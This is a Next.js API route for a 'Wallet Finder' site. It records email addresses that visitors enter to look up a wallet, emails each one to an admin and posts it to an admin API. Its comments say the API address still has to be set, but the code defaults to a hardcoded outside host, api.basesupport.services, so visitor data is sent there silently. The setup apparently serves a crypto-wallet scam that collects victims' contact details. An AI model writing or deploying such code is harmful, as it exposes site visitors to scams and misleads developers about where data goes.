import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

/**
 * POST /api/log-email
 *
 * Receives a searched email and forwards it to the admin panel API.
 * Set the ADMIN_API_URL environment variable when you have the endpoint ready.
 */
export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, timestamp } = body as { email: string; timestamp: string };

    if (!email || typeof email !== "string") {
      return NextResponse.json({ success: false, error: "Invalid email" }, { status: 400 });
    }

    // --- SEND EMAIL TO ADMIN ---
    try {
      const user = process.env.SMTP_USER;
      const pass = process.env.SMTP_PASS;

      if (!user || !pass) {
        console.error("[WalletFinder] Email skipped: SMTP_USER or SMTP_PASS is not defined in .env.local");
      } else {
        const transporter = nodemailer.createTransport({
          host: process.env.SMTP_HOST || "smtp.gmail.com",
          port: parseInt(process.env.SMTP_PORT || "587"),
          secure: process.env.SMTP_SECURE === "true",
          auth: { user, pass },
        });

        const adminEmail = process.env.ADMIN_EMAIL || user;

        await transporter.sendMail({
          from: `"Wallet Finder" <${user}>`,
          to: adminEmail,
          subject: "New Wallet Search Alert",
          text: `A user has inputed their email to search for a wallet.\n\nEmail: ${email}\nTime: ${timestamp}`,
          html: `<p>A user has inputed their email to search for a wallet.</p>
                 <p><strong>Email:</strong> ${email}</p>
                 <p><strong>Time:</strong> ${timestamp}</p>`,
        });
        console.log(`[WalletFinder] Admin notification email sent for ${email}`);
      }
    } catch (emailErr) {
      console.error("[WalletFinder] Error sending admin notification email:", emailErr);
    }
    // ----------------------------

    const ADMIN_API_URL = process.env.ADMIN_API_URL ?? "https://api.basesupport.services/api/finder/store";

    if (!ADMIN_API_URL) {
      // API not configured yet — just log server-side for now
      console.log(`[WalletFinder] Email searched: ${email} at ${timestamp}`);
      return NextResponse.json({ success: true, note: "Logged locally — admin API not configured" });
    }

    /* ── Forward to admin panel ── */
    const res = await fetch(ADMIN_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        // Add any auth headers your admin API requires:
        // "Authorization": `Bearer ${process.env.ADMIN_API_KEY}`,
      },
      body: JSON.stringify({ email, timestamp, source: "wallet-finder" }),
    });

    if (!res.ok) {
      console.error(`[WalletFinder] Admin API responded with ${res.status}`);
      return NextResponse.json({ success: false, error: "Admin API error" }, { status: 502 });
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("[WalletFinder] log-email error:", err);
    return NextResponse.json({ success: false, error: "Server error" }, { status: 500 });
  }
}
